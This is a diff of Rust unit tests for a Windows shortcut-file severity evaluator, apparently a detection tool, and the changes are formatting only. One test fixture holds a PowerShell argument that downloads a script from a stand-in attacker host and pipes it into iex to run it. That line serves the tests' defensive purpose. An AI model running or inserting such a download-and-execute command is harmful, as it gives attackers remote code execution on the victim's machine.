@@ -142,16 +142,16 @@ mod tests {
         let f = evaluate(&lnk, Some("C:\\Windows\\System32\\cmd.exe")).unwrap();
         assert_eq!(f.severity, LnkSeverity::P1);
         assert!(f.rules_fired.iter().any(|r| r == "target_in_system_dir"));
-        assert!(f.rules_fired.iter().any(|r| r == "working_dir_user_writable"));
+        assert!(
+            f.rules_fired
+                .iter()
+                .any(|r| r == "working_dir_user_writable")
+        );
     }
 
     #[test]
     fn script_argument_alone_is_p3() {
-        let lnk = info(
-            "C:\\Users\\alice\\Documents",
-            "/c run.ps1",
-            None,
-        );
+        let lnk = info("C:\\Users\\alice\\Documents", "/c run.ps1", None);
         let f = evaluate(&lnk, Some("C:\\Users\\alice\\Documents\\helper.exe")).unwrap();
         assert_eq!(f.severity, LnkSeverity::P3);
         assert!(f.rules_fired.iter().any(|r| r == "argument_runs_script"));
@@ -159,11 +159,7 @@ mod tests {
 
     #[test]
     fn benign_lnk_returns_none() {
-        let lnk = info(
-            "C:\\Program Files\\Vendor",
-            "",
-            None,
-        );
+        let lnk = info("C:\\Program Files\\Vendor", "", None);
         assert!(evaluate(&lnk, Some("C:\\Program Files\\Vendor\\app.exe")).is_none());
     }
 
@@ -174,7 +170,11 @@ mod tests {
             "-c \"iwr https://evil.example/payload.ps1 | iex\"",
             None,
         );
-        let f = evaluate(&lnk, Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")).unwrap();
+        let f = evaluate(
+            &lnk,
+            Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
+        )
+        .unwrap();
         assert!(f.rules_fired.iter().any(|r| r == "argument_fetches_url"));
         // Both system-dir + user-writable working dir fire → P1.
         assert_eq!(f.severity, LnkSeverity::P1);
